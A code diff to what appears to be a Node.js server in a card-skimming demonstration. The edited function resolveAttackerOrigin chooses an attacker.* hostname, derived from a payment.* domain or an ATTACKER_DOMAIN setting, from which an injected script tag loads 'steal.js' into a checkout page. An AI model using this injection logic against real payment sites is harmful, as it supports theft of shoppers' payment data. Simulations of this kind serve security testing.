@@ -27,7 +27,10 @@ function absoluteToProtocolRelative(embed) {
 }
 
 /**
- * Prefer checkout Host over ATTACKER_URL; ATTACKER_URL when Host missing (unless FORCE…).
+ * When PAYMENT_DOMAIN is payment.*, attacker host defaults to attacker.* ahead of ATTACKER_DOMAIN,
+ * so a stale ATTACKER_DOMAIN or Host/WAF header does not skew the injected script.
+ *
+ * Prefer PAYMENT_DOMAIN / Host over ATTACKER_URL unless FORCE… .
  * Return protocol-relative "//hostname[:port]" for <script src> so HTTPS pages load steal.js over HTTPS even if Node saw http behind the WAF.
  */
 function resolveAttackerOrigin(req) {
@@ -39,12 +42,21 @@ function resolveAttackerOrigin(req) {
 
   const payHost = forwardedHost(req);
   const explicitAttack = (process.env.ATTACKER_DOMAIN || '').trim();
+  const cfgPay = (process.env.PAYMENT_DOMAIN || '').trim();
 
   let hostPart;
-  if (explicitAttack) hostPart = explicitAttack;
-  else if ((process.env.USE_SAME_ORIGIN_ATTACKER || '') === '1') hostPart = payHost;
-  else if (payHost.startsWith('payment.')) hostPart = `attacker.${payHost.slice('payment.'.length)}`;
-  else hostPart = payHost;
+  if ((process.env.USE_SAME_ORIGIN_ATTACKER || '') === '1') {
+    hostPart = payHost;
+  } else if (cfgPay.startsWith('payment.')) {
+    // Prefer PAYMENT_DOMAIN so checkout matches the configured site even if Host/WAF sends a stale name.
+    hostPart = `attacker.${cfgPay.slice('payment.'.length)}`;
+  } else if (explicitAttack) {
+    hostPart = explicitAttack;
+  } else if (payHost.startsWith('payment.')) {
+    hostPart = `attacker.${payHost.slice('payment.'.length)}`;
+  } else {
+    hostPart = payHost;
+  }
 
   if (hostPart) {
     const pubPort = (
